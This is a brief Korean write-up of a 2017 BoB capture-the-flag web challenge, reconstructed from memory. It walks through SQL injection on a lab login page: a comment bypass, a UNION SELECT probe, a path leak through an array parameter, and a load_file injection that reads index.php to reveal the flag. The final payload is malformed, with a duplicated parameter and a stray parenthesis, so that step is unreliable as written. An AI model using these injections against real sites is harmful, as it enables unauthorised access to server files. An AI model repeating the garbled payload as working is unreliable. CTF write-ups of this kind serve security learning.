# [2017_BOB] \[WEB] ???

\* 서버가 닫혀 있는 관계로 기억을 바탕으로 작성한 Write-up입니다.

### Problem

로그인 창이 뜹니다. admin 문자열이 들어가기만하면 무조건 로그인 실패가 뜹니다. 즉, admin으로 로그인해서 플래그를 추출하는 문제가 아닙니다. 힌트에 load_file 함수를 쓰라고 나옵니다.



### Solution

`http://192.168.32.74/admin/?id=guest' -- &pw=guest`로 접속하면 `Hi, guest!` 문자열이 뜨면서 guest 계정으로 로그인이 되는 것을 확인헀습니다.

`http://192.168.32.74/admin/?id=st' union select 1 -- &pw=guest`을 통해 `Hi, 1!` 문자열을 확인할 수 있었습니다.

`http://192.168.32.74/admin/?id=aaa&pw[]=guest`로 접속하면 에러 메시지가 뜨면서 index.php 파일의 절대경로를 확인할 수 있습니다.

`http://192.168.32.74/admin/?id=guest%27%20--%20&pw=guest)load_file("APM_Setup/b0bf050d2ab945918deb004b10f25b01/www/index.php") -- &pw=guest`로 접속하면 index.php 파일의 소스코드가 출력되면서 flag를 확인할 수 있습니다.